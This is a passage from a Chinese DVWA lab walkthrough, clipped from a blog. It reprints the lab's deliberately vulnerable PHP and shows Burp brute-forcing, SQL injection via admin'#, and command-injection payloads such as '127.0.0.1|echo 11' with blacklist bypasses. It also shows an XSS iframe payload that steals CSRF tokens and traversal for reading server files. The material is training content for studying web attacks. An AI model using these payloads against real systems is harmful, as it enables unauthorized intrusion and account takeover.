---
date: 2022-06-30-星期四 20:22:11
update: 
tags: [time/year2022,time/month06]
id: 20220630202211
---

# DVWA全等级通关教程

[blog.csdn.net](https://blog.csdn.net/weixin_54648419/article/details/114788667)

Brute Force暴力破解-
DVWA之Commend Injection(命令行注入)-
Cross Site Request Forgery (CSRF)(跨站请求伪造)-
File Inclusion(文件包含)-
File Upload(文件上传)-
Insecure CAPTCHA(不安全验证码)-
SQL Injection/SQL Injection(Blind)-
Weak Session IDs-N
Cross Site Scripting (XSS)-
Content Security Policy (CSP) Bypass-
JavaScript Attacks


# Brute Force(暴力破解)

## Low

源代码：![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314150511232.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

    <?php
    if( isset( $_GET[ 'Login' ] ) ) {
        // Get username
        $user = $_GET[ 'username' ];
        // Get password
        $pass = $_GET[ 'password' ];
        $pass = md5( $pass );
        // Check the database
        $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
        if( $result && mysqli_num_rows( $result ) == 1 ) {
            // Get users details
            $row    = mysqli_fetch_assoc( $result );
            $avatar = $row["avatar"];
            // Login successful
            echo "<p>Welcome to the password protected area {$user}</p>";
            echo "<img src=\"{$avatar}\" />";
        }
        else {
            // Login failed
            echo "<pre><br />Username and/or password incorrect.</pre>";
        }
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    ?> 
    
        

low级别的代码直接获取用户输入的用户名和密码，密码再经过[MD5](https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020)进行加密，所以杜绝了通过密码进行SQL注入的可能。

接下来便是直接用burp直接抓包暴力破解密码了，这里有两种方法：

1.  因为没有对用户名进行加密，所以可以用sql注入找出用户名，使用万能公式(也可以用admin’#)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314153759222.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
    直接成功，知道用户名后可以可以用burpsuite跑出密码来。
    
2.  直接用burpsuite中Cluster bomb来暴力破解，这里还是先随便输入个账号密码然后抓包再发送到intruder-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2021031415055048.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314150625281.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314150843785.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314150852343.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
    接下来就是慢慢跑了，这里要等较长的时间，因为所有的账号与第一个密码试，在和第二个试，要试（账号数量乘密码数量）次-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314151323993.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)长度不一样的则是正确的账号了
    

## Medium

源代码：

       <?php
        if( isset( $_GET[ 'Login' ] ) ) {
            // Sanitise username input
            $user = $_GET[ 'username' ];
            $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            // Sanitise password input
            $pass = $_GET[ 'password' ];
            $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass = md5( $pass );
            // Check the database
            $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
            if( $result && mysqli_num_rows( $result ) == 1 ) {
                // Get users details
                $row    = mysqli_fetch_assoc( $result );
                $avatar = $row["avatar"];
                // Login successful
                echo "<p>Welcome to the password protected area {$user}</p>";
                echo "<img src=\"{$avatar}\" />";
            }
            else {
                // Login failed
                sleep( 2 );
                echo "<pre><br />Username and/or password incorrect.</pre>";
            }
            ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
        }
        ?> 
    
        

      phpmysqli_real_escape_string(string,connection)
    
        

函数会对字符串string中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义，意味着不能进行sql注入

     //Login failed
                sleep( 2 );
    
        

爆破失败延时两秒，但仍不影响爆破（会多发费亿点时间），和Low相同的破解过程相同。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314160432401.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## High

源代码：

    <?php
    
    if( isset( $_GET[ 'Login' ] ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    
        // Sanitise username input
        $user = $_GET[ 'username' ];
        $user = stripslashes( $user );
        $user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    
        // Sanitise password input
        $pass = $_GET[ 'password' ];
        $pass = stripslashes( $pass );
        $pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
        $pass = md5( $pass );
    
        // Check database
        $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
        $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
        if( $result && mysqli_num_rows( $result ) == 1 ) {
            // Get users details
            $row    = mysqli_fetch_assoc( $result );
            $avatar = $row["avatar"];
    
            // Login successful
            echo "<p>Welcome to the password protected area {$user}</p>";
            echo "<img src=\"{$avatar}\" />";
        }
        else {
            // Login failed
            sleep( rand( 0, 3 ) );
            echo "<pre><br />Username and/or password incorrect.</pre>";
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    // Generate Anti-CSRF token
    generateSessionToken();
    
    ?>
    
        

Token：`checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );`-
可以抵御CSRF攻击，增加了爆破的难度，因为每次服务器返回的登陆页面中都会包含一个随机的user\_token的值，用户每次登录时都要将user\_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。-
stripslashes： `$pass = stripslashes( $pass );`去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个-
mysql\_real\_escape\_string：`mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $user/$pass` 对username、password进行过滤、转义，进一步抵御sql注入。

方法：-
抓包，发送到intruder，将Attack type设置为pitch fork，为password值和user\_token值添加payload标志-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314164808115.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)在options栏中将Request Engine中的Number of threads改为1。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314164842102.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)在options栏找到Grep - Extract，点击Add。然后点击Refetch response，进行一个请求，即可看到响应报文，直接选取需要提取的字符串，上面的会自动填入数据的起始和结束标识，并将此值保存下来，后面会用到。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314164852514.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314164859928.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
返回payloads栏，payload 1 设置密码字典，payload 2 选择payload type为“Recursive grep”，然后选择下面的extract grep项即可。将刚刚保存的值填到起始值。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314165017780.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314164936168.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)最后start attack，找出长度不同的-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210314165108692.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)[参考文章](https://blog.csdn.net/u014029795/article/details/100006639)

# DVWA之Commend Injection(命令行注入)

有些应用中，可能允许操作者向后台操作系统发送命令并执行，例如测试同网站的连接（ping命令），这种功能一般通过如PHP中的exec、shell\_exec和ASP中的wscript.shell等函数实现。命令注入漏洞指的是在这些功能中，由于对操作者的输入或返回的输出结果控制不严导致能够让恶意操作者利用管道符等将恶意系统命令拼接在正常命令后并执行。

### 常见命令拼接符

1.  |：A|B 不管A命令成功与否，都会去执行b命令。
2.  &：A&B 各自执行
3.  ||：A||B 先执行A，如果为假，再执行B
4.  && ：A&&B 先执行A，如果为真，再执行B
5.  ；： A;B 先执行A后执行B

## Low

### 源代码

    <?php
    
    if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $target = $_REQUEST[ 'ip' ];
    
        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
    
        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    
    ?> 
    
        

    1、stristr($h, $n)：返回 n字符串 在 h字符串中第一次出现的位置开始到结尾的字符串。 
    2、php_uname($mode)： 返回运行 PHP 的系统的有关信息，s模式表示返回操作系统的信息。
    3、shell_exec($cmd)：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。
    
        

构造数据同时输入恶意命令代码，因为系统对此并未过滤，所以恶意命令代码会一并执行。尝试输入：`127.0.0.1& echo 11`-
（这里我的页面乱码了，文字编码改成简体中文即可）-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210323090826631.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
可以看到后面一条命令"echo 11"执行成功，使用其它命令可以进一步利用这个漏洞。

*       ipconfig  查看本地网络
        
              
*       net  user  查看系统用户
        
              
*       dir  查看当前目录
        
              

## Medium
### 源代码

    <?php
    
    if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $target = $_REQUEST[ 'ip' ];
    
        // Set blacklist
        $substitutions = array(
            '&&' => '',
            ';'  => '',
        );
    
        // Remove any of the charactars in the array (blacklist).
        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    
        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
    
        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    
    ?> 
    
        

    1、array_keys($array)：返回一个索引数组，包含$array数组中的所有键名。
    2、str_replace($search, $replace, $subject)：如果 search 是一个数组而 replace 是一个字符串，那么 search 中每个元素的替换将始终使用这个字符串。
    
        

Medium中只将“&&”，“；”加入了黑名单，所以这里用“&”仍然可以（当然使用“|”，“||”，“;”这些都可以）,也可以使用双写绕过`127.0.0.1&;& ipconfig` （将;过滤成空格）

## High
### 源代码

    <?php
    
    if( isset( $_POST[ 'Submit' ]  ) ) {
        // Get input
        $target = trim($_REQUEST[ 'ip' ]);
    
        // Set blacklist
        $substitutions = array(
            '&'  => '',
            ';'  => '',
            '| ' => '',
            '-'  => '',
            '$'  => '',
            '('  => '',
            ')'  => '',
            '`'  => '',
            '||' => '',
        );
    
        // Remove any of the charactars in the array (blacklist).
        $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    
        // Determine OS and execute the ping command.
        if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
            // Windows
            $cmd = shell_exec( 'ping  ' . $target );
        }
        else {
            // *nix
            $cmd = shell_exec( 'ping  -c 4 ' . $target );
        }
    
        // Feedback for the end user
        echo "<pre>{$cmd}</pre>";
    }
    
    ?> 
    
        

黑名单扩展了更多的字符，但是’| '这后面有个空格。所以尝试：

    127.0.0.1|echo 11
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210323092729874.png)

# Cross Site Request Forgery (CSRF)

## Low

### 源代码

    <?php
    
    if( isset( $_GET[ 'Change' ] ) ) {
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];
    
        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
    
            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?> 
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327193917748.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)先随意更改一个密码，发现顶部URL明显就是修改密码的链接-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327193944656.png)-
修改数据再次访问-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327194029722.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## Medium

### 源代码

    <?php
    
    if( isset( $_GET[ 'Change' ] ) ) {
        // Checks to see where the request came from
        if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) {
            // Get input
            $pass_new  = $_GET[ 'password_new' ];
            $pass_conf = $_GET[ 'password_conf' ];
    
            // Do the passwords match?
            if( $pass_new == $pass_conf ) {
                // They do!
                $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
                $pass_new = md5( $pass_new );
    
                // Update the database
                $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
                $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
                // Feedback for the user
                echo "<pre>Password Changed.</pre>";
            }
            else {
                // Issue with passwords matching
                echo "<pre>Passwords did not match.</pre>";
            }
        }
        else {
            // Didn't come from a trusted source
            echo "<pre>That request didn't look correct.</pre>";
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    ?> 
    
        

添加了验证Referer`stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )`，尝试Low中方法果然-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327194842890.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
那我们抓包将每次的Referer改成一样的不就可以了？尝试一下。-
正常更改密码-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327195357753.png)复制网址再访问-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327195648232.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
重新访问并且抓包。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327195739771.png)-
添加Referer

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327195755724.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
Forward后-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210327195818736.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

## High

### 源代码

    <?php
    
    if( isset( $_GET[ 'Change' ] ) ) {
        // Check Anti-CSRF token
        checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
    
        // Get input
        $pass_new  = $_GET[ 'password_new' ];
        $pass_conf = $_GET[ 'password_conf' ];
    
        // Do the passwords match?
        if( $pass_new == $pass_conf ) {
            // They do!
            $pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
            $pass_new = md5( $pass_new );
    
            // Update the database
            $insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
            $result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
    
            // Feedback for the user
            echo "<pre>Password Changed.</pre>";
        }
        else {
            // Issue with passwords matching
            echo "<pre>Passwords did not match.</pre>";
        }
    
        ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
    }
    
    // Generate Anti-CSRF token
    generateSessionToken();
    
    ?> 
    
        

该模块中加入了`Anti-CSRF token`来防范CSRF攻击，即随机生成了一个token，正确时才能通过。这里需要XSS+CSRF来共同完成。（这里我还不太会构造这个js代码，在网上找了一个大佬们弄的）-
找到DVWA中的XSS模块，在Low中抓包投放js代码`<iframe src="../csrf/" onload=alert(frames[0].document.getElementsByName('user_token')[0].value)></iframe>`（其实在哪个难度中都可以，只不过Low中过滤少）然后就出现了这样一个数据信息。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210328091135125.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)-
我在点击DVWA Security后弹出token-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210328091238753.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

构造语句后将这个token添加上，然后回车-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210328091400925.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210328091431357.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)

# File Inclusion

文件包含漏洞是指当服务器开启allow\_url\_include选项时，就可以通过php的某些特性函数（include()，require()和include\_once()，require\_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。-
文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow\_url\_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件.

## Low

### 源代码

    <?php
    
    // The page we wish to display
    $file = $_GET[ 'page' ];
    
    ?> 
    
        

查看源代码可以发现，没有任何过滤和检查

#### 1.本地文件包含漏洞

让page指向一个不存在的文件时会报错，但是直接暴露了服务器文件的路径-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324111810781.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)我们创建一个测试文件,用绝对路径构造url，查找。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324112125397.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210324112436889.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)构造url来读取服务器php.ini以及其他各种信息（我们也可以尝试使用…/来进行目录穿越）-
